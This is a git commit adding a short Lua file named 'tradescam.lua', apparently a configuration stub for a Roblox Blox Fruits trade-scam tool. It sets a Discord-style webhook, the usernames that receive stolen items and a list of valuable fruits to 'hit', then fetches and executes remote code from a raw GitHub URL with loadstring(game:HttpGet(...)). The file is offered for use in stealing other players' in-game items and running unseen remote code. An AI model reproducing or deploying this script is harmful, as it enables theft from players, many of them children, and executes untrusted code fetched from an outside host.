59dbbfafe14c5608bc6a4c073c0c56016ba2172d
wazure-dev <damongacad04@gmail.com>
2025-04-30 17:24:29 +0900

    tradescam.lua

---
+++ tradescam.lua
@@ -0,0 +1,5 @@
+Webhook = "" -- << Your Webhook
+Usernames = {"uruserhereorsmthidk", "somealtuserhere2"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/reasonrekt/stuFF/refs/heads/main/wowowo"))()
